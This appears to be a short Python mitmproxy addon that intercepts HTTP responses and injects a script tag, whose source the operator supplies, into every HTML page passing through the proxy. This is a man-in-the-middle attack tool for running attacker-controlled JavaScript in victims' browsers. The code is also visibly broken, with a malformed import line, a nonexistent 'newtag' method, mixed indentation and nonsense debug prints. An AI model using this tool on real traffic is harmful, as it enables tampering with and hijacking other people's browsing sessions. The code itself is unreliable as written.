from bs4 import BeautifulSoup
from mitmproxy import ctxm http
import argparse

class Injector:
	def __init__(self, path):
	    	self.path = path
	def response(self, flow: http.HTTPFlow) -> None:
		if self.path:
			html = BeautifulSoup(flow.response.content, "html.parser")
			print(self.path)
			print(flow.response.headers["content-type"])
			if flow.response.headers["content-type"] == 'text/html':
				print("uuuuuu")
				print(flow.response.headers["content-type"])
				print("asdf asdf asdf asdf asdf")
				print("-----")
				print("mmmmm")
				script = html.newtag(
					"script",
					src=self.path,
					type='application/javascript')
				html.body.insert(0, script)
				flow.response.content = str(html).encode("utf8")
				print("Script injected.")

def start():
	parser = argparse.ArgumentParser()
	parser.add_argument("path", type=str)
	args = parser.parse_args()
	return Injector(args.path)
